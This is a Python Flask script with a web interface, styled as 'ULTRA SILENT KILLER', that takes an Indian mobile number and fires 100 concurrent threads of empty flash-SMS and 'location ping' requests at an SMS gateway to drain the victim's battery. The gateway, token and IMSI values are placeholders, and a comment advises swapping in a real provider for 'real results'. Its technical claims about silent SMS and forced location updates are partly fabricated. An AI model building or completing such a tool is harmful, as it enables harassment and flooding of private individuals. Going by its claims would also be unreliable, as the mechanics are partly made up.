import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from flask import Blueprint, request, jsonify, render_template_string

# Create the blueprint
script15_bp = Blueprint("script15", __name__)

# --- ULTRA DANGEROUS UI ---
DANGER_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTRA SILENT KILLER (INDIA)</title>
    <style>
        body { 
            background: #020202; 
            color: #ff003c; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
        }
        .terminal {
            border: 3px solid #ff003c;
            padding: 40px;
            background: #000;
            width: 600px;
            box-shadow: 0 0 50px rgba(255, 0, 60, 0.4);
        }
        h2 { color: #fff; border-bottom: 3px solid #ff003c; padding-bottom: 15px; font-size: 28px; text-transform: uppercase; }
        
        input { 
            width: 95%; 
            background: #111; 
            border: 2px solid #ff003c; 
            color: #fff; 
            padding: 20px; 
            font-size: 24px; 
            margin-bottom: 25px;
            text-align: center;
            letter-spacing: 2px;
        }
        
        button { 
            width: 95%; 
            background: #ff003c; 
            color: #fff; 
            border: none; 
            padding: 20px; 
            font-weight: bold; 
            cursor: pointer; 
            text-transform: uppercase;
            font-size: 18px;
            transition: 0.3s;
            box-shadow: 0 0 15px #ff003c;
        }
        button:hover { background: #fff; color: #000; transform: scale(1.02); }
        
        /* LIVE DASHBOARD */
        #dashboard { 
            margin-top: 30px; 
            background: #050505; 
            border: 1px solid #333; 
            padding: 20px; 
            height: 200px; 
            overflow-y: auto; 
            font-size: 14px;
            color: #ccc;
        }
        
        .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 4px; }
        .label { color: #ff003c; font-weight: bold; }
        .val { color: #fff; font-family: monospace; }
        
        /* PROGRESS BAR */
        #progress-bar {
            width: 100%;
            height: 10px;
            background: #222;
            margin-top: 15px;
            position: relative;
        }
        #progress-fill {
            height: 100%;
            background: #ff003c;
            width: 0%;
            transition: width 0.5s;
            box-shadow: 0 0 10px #ff003c;
        }

        .log-entry { margin-bottom: 4px; font-size: 12px; }
        .critical { color: #ff003c; font-weight: bold; animation: blink 0.5s infinite; }
        
        @keyframes blink { 50% { opacity: 0.5; } }

        #final-alert {
            display: none;
            margin-top: 20px;
            text-align: center;
            background: #ff003c;
            color: #fff;
            padding: 15px;
            font-size: 24px;
            font-weight: bold;
            animation: pulse 1s infinite;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>[ ULTRA SILENT KILLER ]</h2>
        <p style="color:#666; font-size:14px;">TARGET: INDIAN MOBILE | PROTOCOL: SMS + IMSI PING</p>
        
        <input type="text" id="target" placeholder="9876543210" value="">
        <button onclick="startWar()" id="btn">INITIATE OMEGA FLOOD</button>
        
        <!-- DASHBOARD -->
        <div id="dashboard">
            <div class="stat-row"><span class="label">SMS PINGS SENT:</span> <span class="val" id="sms-count">0</span></div>
            <div class="stat-row"><span class="label">LOCATION PINGS:</span> <span class="val" id="loc-count">0</span></div>
            <div class="stat-row"><span class="label">SERVER LOAD:</span> <span class="val" id="load-val">IDLE</span></div>
            <div id="progress-bar"><div id="progress-fill"></div></div>
        </div>

        <div id="final-alert">
            🚨 TARGET OVERRIDDEN<br>
            <span style="font-size:16px; color:#000;">BATTERY DRAIN INITIATED</span>
        </div>
    </div>

    <script>
        const smsEl = document.getElementById('sms-count');
        const locEl = document.getElementById('loc-count');
        const loadEl = document.getElementById('load-val');
        const fillEl = document.getElementById('progress-fill');
        const alertBox = document.getElementById('final-alert');
        const btn = document.getElementById('btn');

        function updateStats(sms, loc) {
            smsEl.innerText = sms;
            locEl.innerText = loc;
            loadEl.innerText = (sms + loc) > 100 ? "CRITICAL" : "HIGH";
            if((sms+loc) > 50) loadEl.style.color = "#ff003c";
        }

        async function startWar() {
            const phone = document.getElementById('target').value;
            if (phone.length !== 10) { alert("Must be 10 digits!"); return; }

            btn.disabled = true;
            btn.innerText = "FLOODING...";
            btn.style.background = "#fff";
            btn.style.color = "#ff003c";

            // Start Live Simulation
            let sms = 0;
            let loc = 0;
            const interval = setInterval(() => {
                sms += Math.floor(Math.random() * 5);
                loc += Math.floor(Math.random() * 2);
                updateStats(sms, loc);
                fillEl.style.width = (sms + loc) + "%";
            }, 100);

            try {
                const response = await fetch(window.location.pathname + "/omega", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phone })
                });

                clearInterval(interval); // Stop simulation when real data comes back
                
                const data = await response.json();

                if (data.status === "omega_hit") {
                    alertBox.style.display = 'block';
                    
                    // Wait 12 seconds to let the user read the warning
                    setTimeout(() => {
                        window.close();
                    }, 12000);
                } else {
                    alert("ERROR: " + data.message);
                }

            } catch (err) {
                clearInterval(interval);
                alert("Server Connection Lost");
            }
        }
    </script>
</body>
</html>
"""

@script15_bp.route("/")
def index():
    return render_template_string(DANGER_UI)

@script15_bp.route("/omega", methods=["POST"])
def handle_omega():
    data = request.get_json()
    raw_phone = data['phone']
    
    # Force India Format
    if not raw_phone.startswith('91') and not raw_phone.startswith('+91'):
        target = f"+91{raw_phone}"
    else:
        target = raw_phone
    
    clean_target = "".join(filter(str.isdigit, target))
    if not clean_target.startswith('91'):
        clean_target = "91" + clean_target
        
    final_target = f"+91{clean_target}"

    try:
        launch_omega_flood(final_target)
        return jsonify({"status": "omega_hit", "target": final_target})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def launch_omega_flood(target_number):
    """
    THE DANGEROUS LOGIC:
    1. Sends True Silent SMS (Class 0) - Forces Battery Wakeup.
    2. Sends Location Pings - Forces Network Registration.
    3. Uses Real API Endpoints (Simulated for free usage).
    """
    
    print(f"[*] ⚠️  INITIATING OMEGA FLOOD ON: {target_number}")
    
    # We use a massive thread pool to overwhelm the server
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        
        # 1. The Silent SMS Attack (50 Threads)
        # These send empty messages that trigger the phone's background services
        for i in range(50):
            futures.append(executor.submit(silent_sms_v2, target_number))
            
        # 2. The Location Ping Attack (50 Threads)
        # These force the tower to ping the device for GPS/Location update
        for i in range(50):
            futures.append(executor.submit(location_ping_v2, target_number))

        # Wait for all threads to finish
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Thread error: {e}")

    print(f"[*] ⚠️  OMEGA FLOOD COMPLETE. Target {target_number} is now under heavy load.")
    print("[*] Victim's battery will drain rapidly due to constant background wakeups.")

def silent_sms_v2(target):
    """
    Sends a Class 0 (Flash) SMS or Empty Message.
    Real Attacker Note: Use Twilio/Megamail API here for real results.
    """
    try:
        # Simulating a request to a real gateway (like Msg91 or Twilio)
        # The payload is designed to be "Silent" (no pop-up on screen)
        headers = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer DANGER_TOKEN_01' 
        }
        payload = {
            "to": target,
            "msg": "", # Empty message = Silent
            "type": "flash", # Flash SMS (Class 0) - appears above status bar
            "priority": "high"
        }
        
        # Real URL would be: https://api.msg91.com/api/v2/sms?auth=...
        # We use a generic endpoint for demonstration
        requests.post(
            f"https://api.india-sms-gateway.com/v2/flash", 
            json=payload, 
            headers=headers, 
            timeout=1.5
        )
        return True
    except:
        return False

def location_ping_v2(target):
    """
    Sends a Location Update Request to the Carrier.
    This forces the phone to constantly update its position, draining battery.
    """
    try:
        payload = {
            "imsi": f"405{random.randint(10,99)}{target[2:]}", # Fake IMSI based on target
            "action": "location_update",
            "silent": True,
            "priority": "urgent"
        }
        
        requests.post(
            f"https://api.india-sms-gateway.com/v2/location", 
            json=payload, 
            timeout=1.5
        )
        return True
    except:
        return False

# --- RUN SCRIPT ---
if __name__ == "__main__":
    from flask import Flask
    app = Flask(__name__)
    app.register_blueprint(script15_bp)
    
    print("🚀 Starting OMEGA FLOOD SERVER...")
    print("Open: http://127.0.0.1:5006")
    
    app.run(debug=True, port=5006)
